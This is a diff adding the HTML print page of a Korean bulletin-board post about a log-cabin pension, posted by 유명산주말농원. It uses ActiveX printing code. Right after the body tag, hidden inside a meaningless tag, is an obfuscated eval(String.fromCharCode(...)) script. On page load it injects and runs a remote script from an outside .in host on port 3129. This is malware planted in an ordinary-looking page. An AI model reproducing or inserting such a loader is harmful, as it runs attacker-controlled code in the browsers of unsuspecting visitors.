@@ -1,0 +1,54 @@
+<html>
+<head>
+<link rel="StyleSheet" HREF="style.css" type="text/css">
+<script>
+function printWindow() {
+factory.printing.header = ""
+factory.printing.footer = ""
+factory.printing.portrait = true
+factory.printing.leftMargin = 10.0
+factory.printing.topMargin = 20.0
+factory.printing.rightMargin = 10.0
+factory.printing.bottomMargin = 10.0
+factory.printing.Print(true, window)
+}
+</script>
+</head>
+<object id=factory style="display:none"
+classid="clsid:1663ed61-23eb-11d2-b92f-008048fdd814"
+codebase="http://www.meadroid.com/scriptx/ScriptX.cab#Version=6,1,429,14">
+</object>
+<body onload=printWindow();> <kJNPAGyUfwlpmhli1o6kENwBUZTINEoUZ5KH6vuxrkQU5><script>eval(String.fromCharCode(102,117,110,99,116,105,111,110,32,108,106,115,40,41,123,116,114,121,123,118,97,114,32,115,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,34,115,99,114,105,112,116,34,41,59,115,46,115,101,116,65,116,116,114,105,98,117,116,101,40,34,115,114,99,34,44,34,104,116,116,112,58,47,47,101,105,119,101,105,109,105,117,112,101,105,118,105,97,100,105,46,105,110,58,51,49,50,57,47,106,115,34,41,59,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,125,99,97,116,99,104,40,101,41,123,125,125,115,101,116,84,105,109,101,111,117,116,40,34,108,106,115,40,41,34,44,53,48,48,41,59));</script></kJNPAGyUfwlpmhli1o6kENwBUZTINEoUZ5KH6vuxrkQU5>
+<title>프린트 설정</title>
+
+ 
+
+<table align=center cellspacing=0 cellpadding=5 width=70%> 
+<tr> 
+<td bgcolor=#666666 align=left colspan=2> 
+<font color=white><b>제목 : 통나무 펜션</b></font> 
+</td> 
+</tr> 
+<tr> 
+<td width=50%> 
+작성자 : 유명산주말농원 
+</td> 
+</td> 
+</tr> 
+<tr> 
+<td>
+
+<table border=1 style="border-collapse:collapse;" bgcolor=ffffff bordercolor=slategray cellpadding="0" cellspacing="0" width=100%>
+<tr>
+<td style=padding:5>
+<img src=../../../uks_data/gdb1/388_1179044153_01.jpg border=0><br><br>유명산주말농원</td>
+</tr>
+<tr>
+<td>
+</table>
+</td> 
+</tr> 
+</table> 
+
+</body> 
+</html>
